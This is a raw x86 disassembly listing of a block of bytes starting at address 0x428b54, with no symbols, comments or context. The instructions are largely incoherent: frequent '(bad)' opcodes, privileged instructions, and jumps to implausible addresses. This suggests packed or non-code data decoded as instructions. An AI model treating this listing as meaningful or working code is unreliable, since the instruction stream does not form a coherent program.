  428b54:	mov    edi,DWORD PTR [esi]
  428b56:	cld    
  428b57:	jb     0x428b1f
  428b59:	add    bl,al
  428b5b:	jne    0x428ba2
  428b5d:	mov    edx,DWORD PTR [edi-0x10]
  428b60:	jge    0x428bdf
  428b62:	mov    esi,DWORD PTR [ebx]
  428b64:	lock add ecx,DWORD PTR [ebp+0x3b]
  428b68:	xor    esi,DWORD PTR [ebp-0x77]
  428b6b:	mov    esi,eax
  428b6d:	lock inc ebp
  428b6f:	jge    0x428ba9
  428b71:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428b78:	dec    ebp
  428b79:	mov    esi,DWORD PTR [ebx]
  428b7b:	loopne 0x428b06
  428b7d:	jge    0x428b77
  428b7f:	add    DWORD PTR [ebp-0x7d],eax
  428b82:	clc    
  428b83:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  428b8a:	dec    ebp
  428b8b:	hlt    
  428b8c:	xor    ebx,DWORD PTR [ebp-0x77]
  428b8f:	mov    esi,esp
  428b91:	in     al,0x45
  428b93:	jge    0x428bd1
  428b95:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  428b9c:	dec    ebp
  428b9d:	cmp    al,0x33
  428b9f:	xchg   ebx,eax
  428ba0:	mov    DWORD PTR [ebx-0x14],esi
  428ba3:	add    eax,DWORD PTR [ebp-0xc]
  428ba6:	cmp    BYTE PTR [ebp-0x61],dh
  428ba9:	mov    edi,DWORD PTR [eax+0xf19504]
  428baf:	repnz mov DWORD PTR [ebp+0x20],ebx
  428bb3:	cmp    eax,DWORD PTR [ebp+0xf]
  428bb6:	test   DWORD PTR [edi+ecx*1-0x1],edx
  428bba:	fistp  WORD PTR [ebx+0x0]
  428bbd:	inc    ebp
  428bbe:	mov    ebx,DWORD PTR [edi+0xc]
  428bc1:	add    eax,eax
  428bc3:	inc    ebp
  428bc4:	test   BYTE PTR [ebx],dh
  428bc6:	add    eax,DWORD PTR [ebx]
  428bc8:	add    BYTE PTR [esi+0x45],bl
  428bcb:	ret    0x85
  428bce:	jnp    0x54430f9d
  428bd4:	inc    bp
  428bd6:	inc    ebp
  428bd7:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  428bdd:	fdiv   QWORD PTR [ebx]
  428bdf:	test   DWORD PTR [ecx+0x453af8],edi
  428be5:	push   ebx
  428be6:	add    edi,DWORD PTR [esi+0x708088b]
  428bec:	cmp    esi,eax
  428bee:	sets   BYTE PTR [ecx-0x74fcffce]
  428bf5:	mov    esp,edi
  428bf7:	call   0x33cdd149
  428bfc:	or     BYTE PTR [ebx],al
  428bfe:	inc    ecx
  428bff:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  428c05:	and    BYTE PTR [ebp-0x7074f0bb],al
  428c0b:	lock add cl,al
  428c0e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  428c15:	mov    ch,0x45
  428c17:	clc    
  428c18:	xor    eax,DWORD PTR [ebp+0x3]
  428c1b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  428c21:	inc    ebp
  428c22:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  428c28:	mov    edi,eax
  428c2a:	mov    eax,DWORD PTR [ebp+0x3c]
  428c2d:	mov    ecx,DWORD PTR [eax]
  428c2f:	hlt    
  428c30:	inc    ebp
  428c31:	ror    DWORD PTR [ebx+0x818c45],0xf4
  428c38:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  428c3e:	push   ebp
  428c3f:	mov    edi,DWORD PTR [ebx]
  428c41:	in     al,dx
  428c42:	jne    0x428c05
  428c44:	mov    eax,DWORD PTR [ebp-0x28]
  428c47:	add    DWORD PTR [eax],0xe8058dec
  428c4d:	clc    
  428c4e:	mov    esp,DWORD PTR [edi-0x8]
  428c51:	add    dh,dl
  428c53:	rol    WORD PTR [ebp-0x1],cl
  428c57:	mov    edx,DWORD PTR [eax+0x8]
  428c5a:	jne    0x428c1c
  428c5c:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  428c63:	inc    ebp
  428c64:	push   esp
  428c65:	test   DWORD PTR [ecx+0xf],ecx
  428c68:	sub    edx,esp
  428c6a:	add    eax,DWORD PTR [eax]
  428c6c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  428c72:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  428c79:	mov    eax,DWORD PTR [ecx]
  428c7b:	and    BYTE PTR [eax],al
  428c7d:	adc    BYTE PTR ss:[eax],al
  428c80:	inc    ebp
  428c81:	inc    cx
  428c84:	push   esp
  428c85:	cld    
  428c86:	jne    0x428c88
  428c88:	push   edx
  428c89:	enterw 0xc1,0x4d
  428c8e:	mov    esp,DWORD PTR [esi+0x20]
  428c91:	add    DWORD PTR [ecx-0x7b],eax
  428c94:	add    eax,DWORD PTR [ebx]
  428c96:	str    WORD PTR [eax+0x45]
  428c9a:	lea    ecx,[ebx+0x45890801]
  428ca0:	sbb    BYTE PTR [ebx],al
  428ca2:	dec    ebp
  428ca3:	cmp    al,0xf
  428ca5:	inc    ebp
  428ca6:	push   eax
  428ca7:	mov    esi,DWORD PTR [ebx]
  428ca9:	push   eax
  428caa:	add    eax,eax
  428cac:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  428cb3:	inc    ebp
  428cb4:	add    BYTE PTR [eax],bh
  428cb6:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  428cbd:	(bad)  
  428cbe:	mov    ebx,eax
  428cc0:	loopne 0x428d07
  428cc2:	dec    ebp
  428cc3:	mov    ecx,DWORD PTR [edi]
  428cc5:	cld    
  428cc6:	push   eax
  428cc7:	xchg   DWORD PTR [ebx],esi
  428cc9:	add    DWORD PTR [ebx],ebp
  428ccb:	add    BYTE PTR [ebx],ch
  428ccd:	or     BYTE PTR [ecx],bh
  428ccf:	dec    ecx
  428cd0:	loopne 0x428cd5
  428cd2:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  428cd8:	push   ebp
  428cd9:	add    DWORD PTR [ebx+0x55100800],eax
  428cdf:	dec    ebp
  428ce0:	jmp    0x428c6b
  428ce2:	mov    esp,DWORD PTR [eax]
  428ce4:	sbb    dl,dl
  428ce6:	inc    eax
  428ce7:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  428ced:	add    BYTE PTR [ebx+0x74528555],cl
  428cf3:	push   ebp
  428cf4:	div    DWORD PTR [ebx]
  428cf6:	and    eax,DWORD PTR [ebx]
  428cf8:	add    edx,DWORD PTR [edx-0x30]
  428cfb:	jno    0x428c88
  428cfd:	inc    DWORD PTR [eax+eiz*1]
  428d00:	inc    ebp
  428d01:	push   eax
  428d02:	push   eax
  428d03:	mov    esp,DWORD PTR [edi-0x74beff1c]
  428d09:	mov    edi,esp
  428d0b:	push   eax
  428d0c:	inc    ebp
  428d0d:	enter  0x458b,0x8
  428d11:	push   ecx
  428d12:	(bad)  
  428d13:	call   0x10c96eb
  428d18:	pop    ss
  428d19:	push   ebp
  428d1a:	mov    ecx,DWORD PTR [ebx+0x489408]
  428d20:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  428d26:	push   ecx
  428d27:	jo     0x428d11
  428d29:	inc    DWORD PTR [edi]
  428d2b:	or     BYTE PTR [eax],al
  428d2d:	call   0xcd9477
  428d32:	fmul   QWORD PTR [ebp+0x55]
  428d35:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  428d3b:	mov    bh,0x8c
  428d3d:	adc    al,0x98
  428d3f:	dec    esp
  428d40:	xor    bl,BYTE PTR [eax]
  428d42:	mov    ecx,DWORD PTR [ebp+0xc]
  428d45:	mov    eax,DWORD PTR [ebp-0x4]
  428d48:	mov    esi,DWORD PTR [edi-0x3148f924]
  428d4e:	push   es
  428d4f:	retf   
  428d50:	mov    BYTE PTR [ebp-0x30],0x3b
  428d54:	inc    ebp
  428d55:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  428d5c:	retf   0x83fc
  428d5f:	into   
  428d60:	dec    ebp
  428d61:	retf   
  428d62:	mov    ecx,DWORD PTR [ebp-0x74]
  428d65:	mov    eax,DWORD PTR [eax]
  428d67:	fdiv   QWORD PTR [ebx]
  428d69:	mov    bh,0x3
  428d6b:	push   es
  428d6c:	mov    esi,ecx
  428d6e:	sbb    cl,dl
  428d70:	dec    ebp
  428d71:	sar    DWORD PTR [ebx],cl
  428d73:	push   ebp
  428d74:	jne    0x428d85
  428d76:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  428d7c:	lea    ebx,[eax]
  428d7e:	call   0xf4cc1945
  428d83:	sbb    dh,dl
  428d85:	add    edx,ebx
  428d87:	push   ebp
  428d88:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  428d8e:	push   ecx
  428d8f:	mov    DWORD PTR [eax-0x30],edx
  428d92:	test   DWORD PTR [edx],eax
  428d94:	xadd   esp,esi
  428d97:	pop    es
  428d98:	add    cl,dl
  428d9a:	mov    eax,ecx
  428d9c:	or     al,0x45
  428d9e:	(bad)  
  428d9f:	push   eax
  428da0:	add    DWORD PTR [edx+0x0],eax
  428da3:	add    ecx,DWORD PTR [ecx]
  428da5:	and    dh,cl
  428da7:	call   0xc69677
  428dac:	add    DWORD PTR [ebp+0x0],edx
  428daf:	mov    esp,DWORD PTR [ebp+0x18]
  428db2:	add    BYTE PTR [eax+0x44],cl
  428db5:	xor    eax,DWORD PTR [eax]
  428db7:	add    esp,DWORD PTR [esi+0x3b]
  428dba:	inc    ebp
  428dbb:	je     0x428d40
  428dbd:	push   ecx
  428dbe:	or     cl,BYTE PTR [ebp-0x77]
  428dc1:	add    eax,esi
  428dc3:	or     al,0x5e
  428dc5:	inc    eax
  428dc6:	add    BYTE PTR [ebx],al
  428dc8:	data16 and BYTE PTR [ebp+0x50],al
  428dcc:	sub    DWORD PTR [ecx],0xffffffe8
  428dcf:	add    BYTE PTR [ebp-0x75],ah
  428dd2:	add    BYTE PTR [eax],bl
  428dd4:	enter  0x894d,0x8b
  428dd8:	int3   
  428dd9:	loopne 0x428e0d
  428ddb:	rol    BYTE PTR [eax],0x33
  428dde:	lea    cx,[ebp+0xa]
  428de2:	data16 jb 0x428e2a
  428de5:	add    BYTE PTR [ebx+0x44890855],cl
  428deb:	sbb    ah,al
  428ded:	inc    ebp
  428dee:	lldt   WORD PTR ss:[edx+0x66]
  428df3:	xor    ecx,DWORD PTR [eax]
  428df5:	sub    edi,esp
  428df7:	mov    eax,DWORD PTR [eax]
  428df9:	or     al,0x66
  428dfb:	ror    edx,cl
  428dfd:	dec    ebp
  428dfe:	inc    ebp
  428dff:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  428e05:	cld    
  428e06:	or     BYTE PTR [edi+0x4501dd],dl
  428e0c:	(bad)  
  428e0d:	into   
  428e0e:	out    dx,al
  428e0f:	retf   
  428e10:	(bad)  
  428e11:	dec    ebp
  428e12:	mov    al,0x8b
  428e14:	jmp    0xea27:0x450ac320
  428e1b:	xchg   esi,ebp
  428e1d:	add    edi,eax
  428e1f:	add    BYTE PTR [eax+0x3f52e955],bh
  428e25:	push   ebp
  428e26:	inc    ebp
  428e27:	xor    ebx,esp
  428e29:	add    ebp,esi
  428e2b:	push   edx
  428e2c:	push   bp
  428e2e:	inc    ebp
  428e2f:	(bad)  
  428e30:	in     eax,dx
  428e31:	push   esp
  428e32:	(bad)  
  428e33:	inc    edx
  428e35:	sbb    al,0x33
  428e37:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  428e3e:	add    BYTE PTR [ebp+0x43],0x8b
  428e42:	jmp    0xf98b:0x100041c8
  428e49:	xor    esi,DWORD PTR [edx+0x3]
  428e4c:	mov    ecx,DWORD PTR [edi]
  428e4e:	fmul   DWORD PTR [edx]
  428e50:	add    BYTE PTR [eax],al
  428e52:	lea    eax,[ebx-0x4700273c]
  428e58:	add    al,0x4f
  428e5a:	pop    DWORD PTR [eax]
  428e5c:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  428e62:	push   edx
  428e63:	inc    WORD PTR [ebp+0x8]
  428e67:	mov    eax,0x514f4d
  428e6c:	(bad)
  428e70:	add    al,al
  428e72:	xor    DWORD PTR [ebx-0x74baf730],eax
  428e78:	test   DWORD PTR [esi+0x74],esp
  428e7b:	inc    ebp
  428e7c:	mov    DWORD PTR [eax+0xa4f08],edi
  428e82:	add    BYTE PTR [ecx-0x76c435bb],cl
  428e88:	or     dh,cl
  428e8a:	or     eax,0x8b8d5045
  428e8f:	inc    ebp
  428e90:	mov    WORD PTR [ecx+0x3b8a00],?
  428e96:	jne    0x428ecb
  428e98:	mov    edi,DWORD PTR [edx+0x8f3a18]
  428e9e:	add    DWORD PTR [ebx],eax
  428ea0:	add    bh,bh
  428ea2:	adc    DWORD PTR [eax],ecx
  428ea4:	adc    DWORD PTR [ebp+0x55],edi
  428ea7:	push   es
  428ea8:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  428eae:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  428eb5:	inc    ebp
  428eb6:	mov    esp,edi
  428eb8:	or     al,0xdc
  428eba:	push   eax
  428ebb:	(bad)  
  428ebc:	jne    0x428e72
  428ebe:	call   0x3a87af
  428ec3:	inc    ebp
  428ec4:	rol    dl,0x84
  428ec7:	out    dx,al
  428ec8:	add    bh,al
  428eca:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  428ed1:	(bad)  
  428ed2:	and    al,al
  428ed4:	fs in  eax,dx
  428ed6:	inc    DWORD PTR [ebp-0x7b]
  428ed9:	js     0x428eea
  428edb:	leave  
  428edc:	scas   al,BYTE PTR es:[edi]
  428edd:	inc    esp
  428ede:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  428ee5:	or     BYTE PTR [ebx-0x97717c5],0x83
  428eec:	call   DWORD PTR [edi]
  428eee:	shr    ah,0x84
  428ef1:	xchg   DWORD PTR [eax],eax
  428ef3:	add    DWORD PTR [eax],eax
  428ef5:	add    bh,bh
  428ef7:	dec    ebp
  428ef8:	and    BYTE PTR [ecx-0x38],dl
  428efb:	push   eax
  428efc:	dec    DWORD PTR [ebx+0xfd885]
  428f02:	mov    BYTE PTR [ebp+0x508bac00],cl
  428f08:	mov    WORD PTR [ecx+0x0],ss
  428f0b:	lea    ecx,[ebx+0x108b20d8]
  428f11:	mov    WORD PTR [edx],ds
  428f13:	add    BYTE PTR [edi+0xff01ff],al
  428f19:	mov    ecx,DWORD PTR [ebp-0x28]
  428f1c:	push   ecx
  428f1d:	shl    BYTE PTR [ebp+0x3a],0x8b
  428f21:	inc    ebp
  428f22:	in     al,0xeb
  428f24:	jno    0x428eb1
  428f26:	push   edx
  428f27:	mov    DWORD PTR [eax-0x28],edx
  428f2a:	mov    eax,DWORD PTR [ebp+0x20]
  428f2d:	je     0x428eb6
  428f2f:	mov    eax,DWORD PTR [ecx]
  428f31:	sbb    BYTE PTR [eax],al
  428f33:	pop    DWORD PTR [eax]
  428f35:	add    esi,eax
  428f37:	add    bl,al
  428f39:	adc    DWORD PTR [edi],esi
  428f3b:	jmp    0x8bcddf8d
  428f40:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  428f47:	jne    0x428ed4
  428f49:	mov    ecx,DWORD PTR [eax]
  428f4b:	in     al,0x75
  428f4d:	pop    DWORD PTR [ecx+0x5001]
  428f53:	push   edx
  428f54:	inc    DWORD PTR [ebx]
  428f56:	adc    BYTE PTR [ecx+0x45721cc6],cl
  428f5c:	add    BYTE PTR [edi+0x9],dl
  428f5f:	call   DWORD PTR [esi]
  428f61:	and    dl,al
  428f63:	and    bh,bh
  428f65:	inc    edi
  428f67:	test   eax,edx
  428f69:	sldt   ebx
  428f6c:	cmp    DWORD PTR [eax],eax
  428f6e:	pushf  
  428f6f:	(bad)  
  428f70:	jmp    0x428f7e
  428f72:	mov    eax,edi
  428f74:	or     al,0x75
  428f76:	inc    eax
  428f77:	call   0x42867f
  428f7c:	mov    eax,eax
  428f7e:	loopne 0x428f04
  428f80:	inc    ebp
  428f81:	add    BYTE PTR [ebx+0x1451c00],cl
  428f87:	mov    eax,DWORD PTR [ebp+0x20]
  428f8a:	add    edi,ecx
  428f8c:	add    BYTE PTR [eax],ch
  428f8e:	cmp    edi,0x18
  428f91:	test   DWORD PTR [ebp+0xf],esi
  428f94:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  428f9b:	jne    0x428f9f
  428f9d:	call   0xffa18a62
  428fa2:	leave  
  428fa3:	rcr    BYTE PTR [esp+eax*4],0x55
  428fa7:	add    ah,ch
  428fa9:	add    BYTE PTR [edi-0x48fef979],dh
  428faf:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  428fb6:	inc    esp
  428fb7:	mov    ebx,DWORD PTR [eax]
  428fb9:	fcom   st(2)
  428fbb:	add    BYTE PTR [edi],bl
  428fbd:	lea    ecx,[eax-0x18]
  428fc0:	(bad)  
  428fc1:	push   DWORD PTR [ecx]
  428fc3:	call   0xffb4dd25
  428fc8:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  428fcc:	fstp   DWORD PTR [esi+ebx*8]
  428fcf:	push   ebp
  428fd0:	pop    ebp
  428fd1:	mov    esi,DWORD PTR [edx-0x38]
  428fd4:	add    DWORD PTR [eax],0x28
  428fd7:	mov    edi,DWORD PTR [ebx]
  428fd9:	xor    esi,DWORD PTR [edx+0x3]
  428fdc:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  428fe0:	pop    ebp
  428fe1:	or     al,0x4
  428fe3:	inc    ecx
  428fe4:	push   ebp
  428fe5:	(bad)  
  428fe6:	in     al,dx
  428fe7:	or     ah,ch
  428fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fea:	xbegin 0xffc805e0
  428ff0:	clc    
  428ff1:	adc    al,0x45
  428ff3:	idiv   BYTE PTR [ecx]
  428ff5:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  428ffc:	test   DWORD PTR [eax+0x665300f8],ebx
  429002:	add    BYTE PTR [ecx+0x66],dh
  429005:	add    eax,DWORD PTR [ebp+0x52]
  429008:	adc    eax,0x20
  42900b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429011:	test   DWORD PTR [eax],eax
  429013:	clc    
  429014:	data16 or al,BYTE PTR [ebp+0x45]
  429018:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42901f:	rol    BYTE PTR [ebp+0x45],1
  429022:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  429028:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42902e:	push   ebx
  42902f:	add    BYTE PTR [eax+0x0],dl
  429032:	push   ecx
  429033:	jge    0x429068
  429035:	add    BYTE PTR [esi+0x4],dl
  429038:	jne    0x42909f
  42903a:	mov    edx,0x457200
  42903f:	jmp    0x429003
  429041:	xor    edi,DWORD PTR [ebx]
  429043:	pop    edi
  429044:	cvtdq2ps xmm7,xmm0
  429047:	ret    0x0
  42904a:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  429050:	xor    ecx,DWORD PTR [edi]
  429052:	add    eax,DWORD PTR [ecx+0x3b]
  429055:	push   ebx
  429056:	rdpmc  
  429058:	out    0x8d,al
  42905a:	add    BYTE PTR [eax],cl
  42905c:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429062:	ret    0x450c
  429065:	sbb    al,0x8b
  429067:	cmp    eax,esi
  429069:	or     cl,al
  42906b:	or     al,0xc2
  42906d:	pop    eax
  42906e:	inc    ebp
  42906f:	add    ecx,DWORD PTR [edi]
  429071:	add    esi,DWORD PTR [ebp+0x39]
  429074:	invd   
  429076:	jge    0x429082
  429078:	mov    eax,0x478ac0
  42907d:	cli    
  42907e:	xor    esp,ecx
  429080:	mov    ebx,0x5b8ac0
  429085:	ret    0x33
  429088:	mov    eax,0x833a8b
  42908d:	sub    BYTE PTR [ebx],al
  42908f:	inc    ebp
  429090:	data16 cmp al,bh
  429093:	pushf  
  429094:	inc    bh
  429096:	mov    esp,esp
  429098:	hlt    
  429099:	test   DWORD PTR [ebp-0x8],esi
  42909c:	mov    eax,DWORD PTR [ebp-0x14]
  42909f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  4290a5:	dec    edi
  4290a6:	or     BYTE PTR [eax],al
  4290a8:	jne    0x429033
  4290aa:	mov    esi,esp
  4290ac:	call   0x77a91c71
  4290b1:	inc    ebp
  4290b2:	mov    DWORD PTR [eax+0x984f0c],edi
  4290b8:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4290be:	add    BYTE PTR [esi+0x7d],ah
  4290c1:	inc    ebp
  4290c2:	mov    bx,WORD PTR [ebp+0x8]
  4290c6:	add    DWORD PTR [ebp+0x50],0x30c008b
  4290cd:	inc    ebp
  4290ce:	mov    bx,di
  4290d1:	lock test BYTE PTR [ecx+0x7000801],bh
  4290d8:	jge    0x42909b
  4290da:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  4290e0:	cli    
  4290e1:	xor    bl,bh
  4290e3:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4290e9:	test   BYTE PTR [eax],cl
  4290eb:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4290f2:	cmp    ebp,eax
  4290f4:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4290fb:	test   BYTE PTR [ebp+0x1],bh
  4290fe:	mov    ebx,0x458a00
  429103:	xor    esi,DWORD PTR [ebx]
  429105:	add    esp,DWORD PTR [esi-0x77]
  429108:	pop    ebp
  429109:	loopne 0x429171
  42910b:	inc    ebp
  42910c:	clc    
  42910d:	xor    edi,DWORD PTR [ebx]
  42910f:	add    esi,DWORD PTR [edx-0x77]
  429112:	data16 fdivr QWORD PTR [ebp-0x49]
  429116:	mov    ebx,0xb78afc
  42911b:	hlt    
  42911c:	xor    esi,DWORD PTR [esi]
  42911e:	data16 add BYTE PTR [ebp+0x66],bl
  429122:	data16 lock clc 
  429125:	cmp    eax,DWORD PTR ss:[eax]
  429128:	ja     0x429190
  42912a:	psubq  mm7,QWORD PTR [ebp-0x4]
  42912e:	ltr    WORD PTR [ebp+0x66]
  429132:	add    esi,eax
  429134:	add    di,WORD PTR [ebp+0x2b]
  429138:	data16 data16 jge 0x4291b9
  42913c:	mov    ebx,0xe08a8b
  429141:	jge    0x429176
  429143:	data16 data16 xor al,0x5d
  429147:	data16 data16 jne 0x429143
  42914b:	mov    edi,DWORD PTR [ebx]
  42914d:	fdiv   QWORD PTR [edx+0x7d]
  429150:	data16 data16 jge 0x429188
  429154:	mov    ebx,0x758a66
  429159:	mov    esi,0x667233
  42915e:	pop    ebp
  42915f:	or     BYTE PTR [esi+0x0],ah
  429162:	clc    
  429163:	mov    edi,DWORD PTR [ebx]
  429165:	lock ja 0x4290f3
  429168:	(bad)  
  42916a:	jge    0x429163
  42916c:	invd   
  42916e:	pop    ebp
  42916f:	add    BYTE PTR [ebx],al
  429171:	(bad)  
  429172:	cmp    di,WORD PTR [ebp+0xf]
  429176:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42917a:	mov    bx,WORD PTR [ebp-0x10]
  42917e:	pop    bp
  429180:	fbstp  TBYTE PTR [ebx]
  429182:	test   DWORD PTR [ebx],eax
  429184:	add    BYTE PTR [ebx],bh
  429186:	add    BYTE PTR [esi+0x7d],ah
  429189:	jge    0x429116
  42918b:	data16 in al,dx
  42918d:	pop    ebp
  42918e:	stc    
  42918f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429196:	mov    edi,ebx
  429198:	in     al,dx
  429199:	test   BYTE PTR [ebp+0x0],bh
  42919c:	mov    eax,DWORD PTR [eax]
  42919e:	call   0xbd3f8b2e
  4291a3:	ss cwde 
  4291a5:	add    BYTE PTR [edx],dh
  4291a7:	mov    bx,di
  4291aa:	call   0x8b4b0f3a
  4291af:	add    ebp,esp
  4291b1:	mov    bx,di
  4291b4:	jnp    0x4291dc
  4291b6:	mov    DWORD PTR [ebx+0x367df808],ecx
  4291bc:	mov    eax,DWORD PTR [eax]
  4291be:	call   0x7c3e1d29
  4291c3:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4291c9:	data16 data16 fistp WORD PTR [ebp+0xe]
  4291ce:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  4291d8:	fisttp WORD PTR [ecx-0x7401f77b]
  4291de:	(bad)  
  4291df:	cld    
  4291e0:	jne    0x429218
  4291e2:	xor    eax,DWORD PTR [eax]
  4291e4:	mov    esp,DWORD PTR [esi-0x10]
  4291e7:	sti    
  4291e8:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4291ef:	data16 adc bl,bh
  4291f2:	push   ebp
  4291f3:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  4291fa:	mov    WORD PTR [eax],es
  4291fc:	cwde   
  4291fd:	data16 xor bh,bl
  429200:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429206:	mov    esp,DWORD PTR [esi-0x14]
  429209:	fisttp WORD PTR [ebx-0x3748a9f2]
  42920f:	or     al,0x2b
  429211:	mov    bh,0xba
  429213:	hlt    
  429214:	mov    bh,bl
  429216:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42921c:	dec    edi
  42921d:	or     al,0x0
  42921f:	mov    edi,DWORD PTR [ebx]
  429221:	or     BYTE PTR [ebp+0x3b],dh
  429224:	mov    ecx,DWORD PTR [edi]
  429226:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42922c:	xor    al,0xd8
  42922e:	pop    bp
  429230:	lock xor esi,DWORD PTR [ebx]
  429233:	lea    esp,[esi+0x1f]
  429236:	icebp  
  429237:	jb     0x42923d
  429239:	add    al,al
  42923b:	jge    0x429249
  42923d:	mov    eax,eax
  42923f:	fsubr  st,st(3)
  429241:	pop    ebp
  429242:	mov    esi,DWORD PTR [ebx]
  429244:	in     al,0x8d
  429246:	rcr    DWORD PTR [edi],0xc2
  429249:	jb     0x4292a9
  42924b:	add    cl,cl
  42924d:	jge    0x42925b
  42924f:	mov    edx,DWORD PTR [ebp-0x20]
  429252:	in     al,dx
  429253:	pop    ebp
  429254:	data16 data16 or BYTE PTR [esi+edi*4],bh
  429259:	data16 cmp bh,BYTE PTR [ebp+0x0]
  42925d:	mov    ebp,DWORD PTR [ebx]
  42925f:	fdivr  QWORD PTR [esi+0x668a5d]
  429265:	cmp    al,0x33
  429267:	mov    si,0x4f7d
  42926b:	mov    eax,DWORD PTR [eax]
  42926d:	lock inc ebp
  42926f:	mov    esi,DWORD PTR [edi]
  429271:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429278:	clc    
  429279:	(bad)  
  42927a:	cmp    edi,DWORD PTR [ebx]
  42927c:	je     0x42928d
  42927e:	push   ebx
  42927f:	loopne 0x429290
  429281:	dec    ecx
  429283:	mov    ebp,DWORD PTR [eax-0x1c]
  429286:	int    0xf1
  429288:	mov    esi,0x703084d
  42928d:	orps   xmm6,xmm1
  429290:	add    BYTE PTR [ebp+0x66],dh
  429293:	jmp    0x429260
  429295:	mov    eax,DWORD PTR [ebx]
  429297:	lock push ebp
  429299:	ror    DWORD PTR [ebp-0x2972feb3],1
  42929f:	or     bh,dl
  4292a1:	jb     0x4292a1
  4292a3:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4292a9:	loopne 0x4292ab
  4292ab:	jne    0x4292a9
  4292ad:	data16 add BYTE PTR [esi+eiz*2],dh
  4292b1:	mov    ecx,ebx
  4292b3:	data16 ss icebp 
  4292b6:	add    BYTE PTR [esi],dh
  4292b8:	data16 add bl,cl
  4292bb:	data16 xor dh,dl
  4292be:	add    BYTE PTR [edx],dh
  4292c0:	data16 add bl,cl
  4292c3:	enterw 0x4df1,0x19
  4292c8:	pop    edi
  4292c9:	jne    0x42924c
  4292cb:	mov    esi,DWORD PTR [edi]
  4292cd:	call   0x77b71e6e
  4292d2:	xor    ebp,DWORD PTR [ebx]
  4292d4:	lea    esp,[esi+0x48]
  4292d7:	repnz in eax,0x3b
  4292da:	add    BYTE PTR [ebp-0x37],dh
  4292dd:	xor    edx,DWORD PTR [ebp-0x15]
  4292e0:	in     al,dx
  4292e1:	xor    edx,DWORD PTR [esi+0x40]
  4292e4:	mov    DWORD PTR [edi],0x338545fc
  4292ea:	clc    
  4292eb:	add    edi,DWORD PTR [eax]
  4292ed:	pop    edi
  4292ee:	pushf  
  4292ef:	pop    ebx
  4292f0:	call   0xff4392b7
  4292f5:	mov    edi,eax
  4292f7:	push   ecx
  4292f8:	pop    es
  4292f9:	mov    edi,DWORD PTR [ebx]
  4292fb:	push   esi
  4292fc:	inc    ebx
  4292fd:	cld    
  4292fe:	js     0x429300
  429300:	popa   
  429301:	data16 (bad) 
  429303:	into   
  429304:	push   0xb900cd36
  429309:	data16 or dh,cl
  42930c:	pop    es
  42930d:	xor    ah,BYTE PTR [esi+0x0]
  429310:	add    bh,al
  429312:	cld    
  429313:	cld    
  429314:	add    BYTE PTR [ebp+0x38c3f866],al
  42931a:	ss pushf 
  42931c:	add    BYTE PTR [esi+0x66],ah
  42931f:	into   
  429320:	ret    
  429321:	pop    ebp
  429322:	add    al,0x57
  429324:	add    BYTE PTR [edi-0x723c409a],dh
  42932a:	add    edi,edi
  42932c:	jne    0x42937e
  42932e:	lea    edx,[ecx+0x1]
  429331:	mov    ebx,0xd64ff1
  429336:	sar    DWORD PTR [ebx],1
  429338:	test   BYTE PTR [ebp+0x30],dh
  42933b:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42933f:	push   edi
  429340:	xor    BYTE PTR [ebx],0x3b
  429343:	mov    esi,ebx
  429345:	xor    eax,DWORD PTR [eax-0x3c73879a]
  42934b:	xor    BYTE PTR [ebp+0x64],al
